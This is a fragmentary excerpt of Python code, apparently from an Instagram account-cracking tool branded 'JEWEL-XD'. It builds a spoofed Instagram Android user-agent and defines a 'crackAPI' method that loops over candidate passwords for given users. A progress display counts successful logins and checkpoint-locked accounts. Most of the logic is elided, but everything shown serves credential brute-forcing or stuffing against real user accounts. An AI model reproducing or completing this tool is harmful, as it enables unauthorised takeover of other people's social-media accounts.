...
for i in range(10000):
	...
	l='Mobile Safari/537.36 Instagram 84.0.0.21.105 Android (24/7.0; 380dpi; 1080x1920; OnePlus; ONEPLUS A3010; OnePlus3T; qcom; en_US; 145652094)'
...
class instagram:
	...
	def crackAPI(self,user,pas):
		...
		prog.update(des,description=f"[bold green]JEWEL-XD[white] {loop}/{len(internal)} OK-:{H2}{len(success)}{P2} CP-:{K2}{len(checkpoint)}{P2}")
		prog.advance(des)
		try:
			for pw in pas:
